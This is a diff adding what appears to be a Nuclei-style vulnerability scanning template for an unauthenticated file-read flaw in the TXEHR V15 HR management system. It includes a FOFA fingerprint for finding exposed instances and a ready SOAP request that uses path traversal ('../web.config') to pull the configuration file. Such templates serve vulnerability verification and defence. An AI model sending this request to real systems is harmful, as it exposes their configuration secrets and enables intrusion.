@@ -1,0 +1,48 @@
+id: tongxiangHR-TXEHR_V15_DownloadTemplate-File-reading
+
+info:
+  name: 同享人力资源管理系统-TXEHR V15 DownloadTemplate 文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+    同享人力资源管理系统-TXEHR V15 DownloadTemplate.asmx 接口处存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485039&idx=1&sn=77e04705702397154c3acb50aeef8ab2&chksm=c267b35cf5103a4a221d45fa88d539dac31afb530629a583006872c0e0e899d9d25a28d2d2ba&token=1439003696&lang=zh_CN#rd
+  tags: File reading
+
+
+
+http:
+  - raw:
+      - |
+        POST /Service/DownloadTemplate.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/DownloadFile"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+             <DownloadFile xmlns="http://tempuri.org/">
+                 <path>../web.config</path>
+             </DownloadFile>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD94bWwg'
+          - '<?xml version="1.0"'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
